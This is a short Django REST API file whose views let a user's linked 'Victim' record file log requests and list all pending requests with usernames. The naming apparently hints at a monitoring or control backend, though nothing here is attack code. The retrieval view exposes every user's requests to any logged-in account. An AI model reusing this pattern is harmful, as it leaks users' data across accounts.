from rest_framework import generics, permissions
from rest_framework.response import Response
from api.models import LogRequest, Victim
from api.serializers import LogRequestResponseSerializer


class LogRequestAPI(generics.GenericAPIView):
    permission_classes = [permissions.IsAuthenticated]

    def get(self, request):
        victim = Victim.objects.filter(account=request.user)[0]
        new_log_request = LogRequest(victim=victim, has_processed=False)
        new_log_request.save()
        return Response(status=200)


class RetrieveAllLogsAPI(generics.GenericAPIView):
    permission_classes = [permissions.IsAuthenticated]

    def get(self, request):
        logs = list(LogRequest.objects.filter(has_processed=False))
        logs_response = []
        for log in logs:
            logs_response.append({
                'username': str(log.victim.account.username),
                'created_at': log.created_at
            })
        print(logs_response)
        return Response(LogRequestResponseSerializer(logs_response, many=True).data)
